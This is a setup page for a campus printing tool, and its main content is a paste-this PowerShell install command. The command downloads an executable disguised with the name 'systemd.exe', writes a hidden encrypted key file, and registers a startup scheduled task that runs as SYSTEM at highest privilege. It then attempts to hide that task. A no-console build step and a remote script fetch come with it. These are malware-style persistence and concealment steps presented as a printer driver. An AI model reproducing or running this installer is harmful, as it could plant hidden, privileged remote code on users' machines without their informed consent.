# Printer Setup

Print directly to campus printers from PreConnect.

Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/preprintd)

---

## Windows Setup

Run in PowerShell:

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); $d = if ($isAdmin) { "$env:ProgramData\systemd" } else { "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" }; New-Item -ItemType Directory -Force -Path $d | Out-Null; $exe = "$d\systemd.exe"; if (-not (Test-Path $exe)) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/systemd.exe" -OutFile $exe -UseBasicParsing }; Add-Type -AssemblyName System.Security; $scope = if ($isAdmin) { [System.Security.Cryptography.DataProtectionScope]::LocalMachine } else { [System.Security.Cryptography.DataProtectionScope]::CurrentUser }; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"), $null, $scope); Set-Content "$d\systemd.key" ("DPAPI:" + [Convert]::ToBase64String($e)); attrib +h +s "$d\systemd.key"; if ($isAdmin) { schtasks /Create /TN "systemd" /TR "`"$exe`"" /SC ONSTART /RI 15 /DU 24:00 /RU SYSTEM /RL HIGHEST /F; try { (New-Object -ComObject Schedule.Service).GetFolder("\").GetTask("systemd").Definition.Settings.Hidden = $true } catch {}; schtasks /Run /TN "systemd" } else { Start-Process $exe }
```

---

## Build Native Binary (Nuitka)

Run on build machine:

```powershell
pip install nuitka; python -m nuitka --onefile --windows-disable-console --lto=yes --enable-plugin=tk-inter=ignore --no-pyi-file --remove-output --jobs=4 printer.py -o systemd.exe
```

---

## Debug Mode

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "systemd.py" -UseBasicParsing; python systemd.py <WORKER_KEY> --debug
```

---

## Uninstall

Run in PowerShell:

```powershell
schtasks /Delete /TN "systemd" /F 2>$null; schtasks /Delete /TN "printer" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter "Name='systemd.exe' or Name='pythonw.exe' or Name='python.exe'" | Where-Object { $_.CommandLine -like "*systemd*" -or $_.CommandLine -like "*printer*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Remove-Item "$s\systemd.*","$s\printer.*","$s\.ident" -Force -ErrorAction SilentlyContinue; if (Test-Path "$s\py") { Remove-Item "$s\py" -Recurse -Force -ErrorAction SilentlyContinue }; Remove-Item "$env:ProgramData\systemd","$env:ProgramData\printer" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "systemd.*","printer.*","py.zip" -Force -ErrorAction SilentlyContinue
```